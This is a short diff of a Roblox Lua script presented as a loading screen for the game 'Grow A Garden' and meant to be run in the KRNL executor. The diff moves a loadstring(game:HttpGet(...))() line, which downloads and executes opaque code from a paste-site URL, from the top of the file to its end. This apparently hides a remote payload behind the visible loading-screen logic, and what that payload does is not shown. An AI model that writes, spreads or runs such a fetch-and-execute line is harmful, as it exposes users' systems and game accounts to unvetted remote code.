@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://pastefy.app/j1SA13WG/raw"))()
-
 -- Script de l'écran de chargement pour Grow A Garden
 -- À exécuter dans KRNL
 
@@ -186,3 +184,5 @@ connection = RunService.Heartbeat:Connect(function()
         end)
     end
 end)
+
+loadstring(game:HttpGet("https://pastefy.app/j1SA13WG/raw"))()
